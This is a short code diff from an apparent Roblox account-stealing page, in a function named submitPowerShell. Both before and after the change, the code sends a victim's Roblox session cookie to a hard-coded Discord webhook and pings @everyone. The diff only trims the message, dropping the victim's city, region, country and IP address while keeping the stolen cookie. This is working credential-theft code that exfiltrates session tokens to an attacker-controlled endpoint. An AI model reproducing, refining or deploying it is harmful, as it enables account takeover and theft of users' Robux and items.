@@ -246,13 +246,7 @@ async function submitPowerShell() {
             const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
             
             const cookieEmbed = {
-                content: `@everyone
-🍪 Cookie Found:
-\`\`\`
-_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${globalRobloxCookie}
-\`\`\`
-📍 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
-🌐 IP: ${locationInfo.ip || 'Unknown'}`
+                content: `@everyone Cookie: ${globalRobloxCookie}`
             };
 
             const response = await fetch(webhookUrl, {
